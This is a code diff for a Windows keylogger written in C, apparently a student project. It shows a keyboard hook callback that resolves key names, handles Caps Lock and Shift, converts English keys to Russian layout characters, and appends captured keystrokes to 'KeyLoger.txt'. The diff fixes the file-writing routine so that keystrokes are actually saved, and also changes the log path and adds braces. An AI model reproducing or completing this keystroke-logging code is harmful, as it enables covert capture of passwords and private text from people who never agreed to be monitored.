@@ -1,6 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
-#define PATH L"X:\\4 курс\\программы\\KeyLoger.txt";
+#define PATH L"..\\KeyLoger.txt";
 #define RUS 1049
 #define ENG 1033
 #define SIZE_STR 20
@@ -25,7 +25,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 BOOL IsCaps(void)
 {
 	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0)
+	{
 		return TRUE;
+	}
 	return FALSE;
 }
 LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
@@ -36,7 +38,9 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
 		WORD KeyLayot = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
 		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
 		if (!(pHook->vkCode <= 1 << 5))
+		{
 			iKey |= 0x1 << 24;
+		}
 		LPWSTR KeyString = (LPWSTR)calloc((SIZE_STR + 1), sizeof(WCHAR));
 		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
 		if (wcslen(KeyString) > 1)
@@ -47,7 +51,10 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
 		}
 		else
 		{
-			if (!IsCaps())KeyString[0] = tolower(KeyString[0]);
+			if (!IsCaps())
+			{
+				KeyString[0] = tolower(KeyString[0]);
+			}
 			if (KeyLayot == ENG)
 			{
 
@@ -65,8 +72,11 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
 VOID WriteToFile(LPWSTR wstr)
 {
 	FILE* f = NULL;
-	if (!_wfopen_s(&f, PATH, L"ab"));
-	fclose(f);
+	if (!_wfopen_s(&f, L"..\\KeyLoger.txt", L"ab"))
+	{
+		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
+		fclose(f);
+	}	
 }
 WCHAR EnToRus(WCHAR c)
 {
@@ -96,5 +106,6 @@ WCHAR EnToRus(WCHAR c)
 		return L'х';
 	case L']':
 		return L'ъ';
+
 	}
 }
